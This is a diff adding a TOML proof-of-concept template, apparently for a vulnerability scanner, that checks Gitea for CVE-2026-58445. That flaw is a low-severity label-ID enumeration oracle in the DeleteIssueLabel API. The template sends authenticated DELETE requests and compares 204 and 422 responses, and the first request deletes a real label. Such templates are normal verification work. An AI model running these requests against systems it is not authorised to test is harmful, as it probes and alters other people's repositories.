@@ -1,0 +1,77 @@
+[info]
+author = "ave"
+description = "验证 Gitea DeleteIssueLabel API 跨仓库标签 ID 枚举预言机漏洞。通过对比存在/不存在标签 ID 的响应状态码差异 (204 vs 422) 确认漏洞存在。"
+id = "POC-AVE-2026-0681"
+name = "CVE-2026-58445 PoC"
+severity = "low"
+tags = ["ave-2026-0681"]
+vuln_id = [
+    "CVE-2026-58445",
+    "AVE-2026-0681",
+    "GHSA-pgqf-926r-548m",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "DELETE"
+path = "/api/v1/repos/{{Owner}}/{{Repo}}/issues/{{IssueIndex}}/labels/{{LabelID}}"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json"
+Authorization = "token {{APIToken}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [204]
+type = "status"
+
+[[poc.requests]]
+method = "DELETE"
+path = "/api/v1/repos/{{Owner}}/{{Repo}}/issues/{{IssueIndex}}/labels/999999999"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json"
+Authorization = "token {{APIToken}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [422]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v1/user"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.extractors]]
+json = ["$.login"]
+name = "username"
+part = "body"
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{APIToken}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [200]
+type = "status"
